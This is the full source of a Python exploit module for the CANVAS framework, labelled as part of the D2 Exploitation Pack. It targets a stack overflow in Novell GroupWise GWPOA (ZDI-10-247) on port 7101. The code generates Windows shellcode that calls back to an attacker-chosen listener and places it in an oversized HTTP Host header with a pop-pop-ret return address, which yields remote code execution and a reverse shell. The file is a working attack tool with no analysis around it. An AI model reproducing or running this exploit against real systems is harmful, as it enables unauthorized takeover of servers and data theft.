#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#


import sys

if "." not in sys.path: 
	sys.path.append(".")

import struct
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from shellcode import shellcodeGenerator
from encoder import alphanumeric

# GUI info
NAME = "Novell GroupWise GWPOA Remote Code Execution Vulnerability"

DESCRIPTION = "Stack Overflow Vulnerability in Novell GroupWise GWPOA"

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = "Novell"
DOCUMENTATION["Repeatability"] = "One"
DOCUMENTATION["Date public"] = "2010.11.09"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-247/"
DOCUMENTATION["Versions Affected"] = "Novell GroupWise < 8.02HP"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION = "1.0"

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003" ]

NOTES="""
"""

CHANGELOG="""
"""

targets = {    
    0 : [ "GroupWise 8", 0x10124f8e ], # pop, pop, ret @ GWXis10.dll
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name = NAME      
        self.email = "" 
        self.port = 7101        
        self.version = 0
        self.badstring = "\x00\r\n\t %:"
        return


    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]    


    def createShellcode(self):
        return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)
        
        
    def run(self):
        # Check arguments
        self.host = self.target.interface                
        self.port = int(self.argsDict.get("port", self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
        self.log("Version %d "%(self.version))     
        self.log("Attacking %s:%d"%(self.host, self.port))
        
        sploitstring = self.makesploit()
                
        s = self.gettcpsock()
        s.connect((self.host, self.port))                
        s.send(sploitstring)               
       
        ret = self.ISucceeded()
        
        if not ret:
        	self.log("Sleeping for two seconds to check for callback")
        	time.sleep(2)
        	ret = self.ISucceeded()        

        if ret:
        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
        	self.log("%s done (succeeded!)" % self.name)            
        
        return ret
        
        
    def makesploit(self):				
    	os_name, eip = targets[self.version]
    	ret = struct.pack('<L', eip)
        buff = ("A" * 0x6d1)         
        buff = buff[:100] + self.shellcode + buff[len(self.shellcode)+100:]        
        data = buff + "\xeb\x06\x90\x90" + ret + "\xe9\x3b\xf9\xff\xff" + "C"*0x41e
        
        sploitstring = "GET / HTTP/1.0\r\n"
        sploitstring += "Host: " + data
        sploitstring += "\r\n\r\n"        
	 
    	return sploitstring
      
        		
    def displayVersions(self):
    	i = 0
    	print 'Available versions:'
    	for listline in targets.values():
    		print "\t%d: %s" % (i,listline[0])
    		i += 1


    def usage(self):
    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
    	self.displayVersions()
    	sys.exit(0)


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
